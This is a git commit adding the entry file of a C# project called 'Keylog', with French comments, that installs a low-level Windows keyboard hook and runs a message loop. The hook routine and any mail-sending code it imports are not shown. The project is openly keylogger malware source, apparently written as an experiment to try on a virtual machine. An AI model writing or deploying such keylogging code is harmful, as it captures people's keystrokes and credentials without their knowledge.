4a7953bb6bb8ad65e3be1894c8402cda7ad52c49
Baesposito <48789539+Baesposito@users.noreply.github.com>
2021-12-03 12:10:49 +0100

    Ajoutez des fichiers projet.

---
+++ Keylog/Program.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.IO;
+using System.Net.Mail;
+using System.Net;
+using static System.Net.Mime.MediaTypeNames;
+
+namespace Keylog
+{
+    class Program
+    {
+        
+
+        
+        private static IntPtr hook = IntPtr.Zero;
+        
+        static void Main(string[] args)
+        {
+            hook = Keylog_exe.SetHook(Keylog_exe.llkProcedure);
+            System.Windows.Forms.Application.Run();
+            Keylog_exe.UnhookWindowsHookEx(hook); // permet d'enlever le keylogger, peut a essayer sur une vm
+        }
+
+        
+    }
+}
